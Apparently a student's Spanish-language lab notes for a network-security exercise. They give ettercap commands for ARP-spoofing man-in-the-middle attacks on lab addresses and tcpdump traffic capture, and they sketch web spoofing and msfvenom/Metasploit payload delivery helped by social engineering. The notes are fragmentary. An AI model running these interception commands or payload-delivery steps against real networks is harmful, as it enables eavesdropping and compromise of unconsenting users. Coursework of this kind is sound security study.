# A)
Install ettercap
```bash
apt install ettercap-text-only
```
Funcionamiento:
```bash
ettercap [options][target1][target2]

ejemplo:
ettercap /10.11.48.56//
```
Con ettercap realizaremos ARP spoofing
# B)
Captura de trafico, usando ettercap + wireshark para snifear y visualizar data (pdf, gif, ...)
## Solución
### Spoofing
Comando básico para realizar spoofing:
```bash
ettercap -T -q -i ens33 -M arp:remote //10.11.48.142 //10.11.48.1
```
- -T, text mode
- -q, filtra lo que se muestra por pantalla.
- -i, establece la interfaz a usar.
- -M, man in de midel.
	- arp:remote, uso del MITM arp en remoto.
		- target
		- gateway

Guardar los paquetes recibidos:
```shell
tcpdump -i ens33 -s 65535 -w tcp_bisbi.p
```


# C & E)
Recopilar mac e ipv6 del segmento
// todo lo de ipv6 sin fe....
# E)
Capturar todo el trafico de alguna de nuestras interfaces, ettercap y tcpdump
# F)
Spoofing de web viendo simultáneamente la web (navegador de texto, xdg-open), se debe configurar el navegador en etter.conf.
//evaluación con la navegación en la victima y actualización en el atacante sin interacción
# G)
Generación de peiloads y envió al atacado, la segunda parte es ingeniería social para que parezca natural.
Para creación:
- metasploit + msfvenom (neterpreter/shell/bash)
Social:
- filto ettercap
- ingeniería social